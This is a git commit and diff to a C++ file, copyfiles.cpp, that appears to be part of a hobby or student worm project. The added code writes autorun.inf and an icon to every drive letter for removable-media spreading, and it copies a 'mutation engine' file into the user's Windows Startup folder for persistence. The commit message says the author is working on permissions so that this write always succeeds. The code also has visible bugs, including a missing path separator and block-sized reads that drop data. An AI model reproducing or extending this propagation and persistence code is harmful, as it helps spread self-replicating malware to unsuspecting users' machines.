e50e4dc7df5520b5fdeb5d6cab910b74580aac5a
Nicholas Allen <allen.2020@osu.edu>
2019-04-07 15:16:03 -0400

    copyfiles.cpp now copies mutant.txt to user's startup folder. Working on account permissions to ensure file is written to directory every time.

--- copyfiles.cpp
+++ copyfiles.cpp
@@ -5,6 +5,16 @@
 
 using namespace std;
 
+/*
+ * copyfiles.cpp
+ * 
+ * Copies files relevant to the program to all drives in computer. All removable 
+ * drives receive all program files, whereas the Startup folder in the computer 
+ * receives only the XtoM program.
+ *
+ * Written by Nicholas Allen
+ * allen.2020@osu.edu
+ */
 int main(void) 
 {
 	size_t len = 0;
@@ -12,8 +22,8 @@ int main(void)
 	const int numFiles = 2;
 	char *filenames[numFiles] = { "autorun.inf", "driveicon.ico" };
 	
-	const int numDrives = 26;
-	char *destdrives[numDrives] = {"A:\\", "B:\\", "C:\\", "D:\\", "E:\\",
+	const int numDrives = 25;
+	char *destdrives[numDrives] = {"A:\\", "B:\\", "D:\\", "E:\\",
 								"F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
 								"K:\\", "L:\\", "M:\\", "N:\\", "O:\\",
 								"P:\\", "Q:\\", "R:\\", "S:\\", "T:\\",
@@ -36,6 +46,20 @@ int main(void)
 			strcpy(dest, destdrives[drive]);
 			strcat(dest, filenames[file]);
 			
+			/*
+			// Remove file if it already exists on disk
+			if(remove(dest))
+			{
+				cout << "File " << dest;
+				cout << " does not already exist or could not be deleted." << endl;
+			}
+			else
+			{
+				cout << "File " << dest;
+				cout << " successfully deleted." << endl;
+			}
+			*/
+			
 			FILE *in = fopen(src, "rb");
 			FILE *out = fopen(dest, "wb");
 			
@@ -54,10 +78,44 @@ int main(void)
 					fwrite(buffer, BUFSIZ, 1, out);
 				}
 				
-				cout << "Successfully printed " << filenames[file];
-				cout << " to drive " << destdrives[drive];
+				cout << "Successfully wrote to " << destdrives[drive];
 				cout << endl;
+				
+				fclose(in);
+				fclose(out);
 			}
 		}
 	}
+	
+	//Move mutation engine to Startup directory
+	strcpy(src, "mutant.txt");
+	strcpy(dest, getenv("USERPROFILE"));
+	strcat(dest, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+	strcat(dest, "mutant.txt");
+	
+	FILE *in = fopen(src, "rb");
+	FILE *out = fopen(dest, "wb");
+	
+	if(in == NULL || out == NULL)
+	{
+		cout << "Error copying mutant.txt to startup folder";
+		cout << endl;
+		
+		in = out = 0;
+	}
+	else
+	{
+		while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
+		{
+			fwrite(buffer, BUFSIZ, 1, out);
+		}
+		
+		cout << "Successfully wrote mutant.txt to startup folder";
+		cout << endl;
+		
+		fclose(in);
+		fclose(out);
+	}
+	
+	return 0;
 }
